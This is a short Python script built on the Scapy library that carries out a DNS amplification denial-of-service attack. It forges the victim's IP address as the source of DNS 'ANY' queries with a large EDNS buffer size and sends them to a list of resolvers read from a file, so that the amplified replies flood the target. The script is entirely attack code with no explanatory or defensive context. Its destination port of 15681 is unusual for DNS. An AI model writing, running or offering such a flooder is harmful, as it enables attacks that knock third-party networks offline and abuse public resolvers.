from scapy.all import *
from sys import argv

ip_target = argv[1]
domain_name = argv[2]
if len(argv) == 3:
    count_packet = 10  
    file_dns_server = 'resolvers.txt'
if len(argv) == 4:
    count_packet = int(argv[3])  
    file_dns_server = 'resolvers.txt'
elif len(argv)==5:
    count_packet = int(argv[3])   
    file_dns_server = argv[4]
ip_dns_servers = []

with open(file_dns_server,'r') as f:
    lines = f.readlines()
    for l in lines:
        ip_dns_servers.append(l.strip('\n '))
len_dns_servers = len(ip_dns_servers)
for i in range(count_packet):
    packet = IP(src=ip_target, dst=ip_dns_servers[i%len_dns_servers]) / UDP(dport=15681) / DNS(rd=1,qd=DNSQR(qname=domain_name,qtype=0xff),ar=DNSRROPT(rclass=1472,z=0x0))
    send(packet)
    

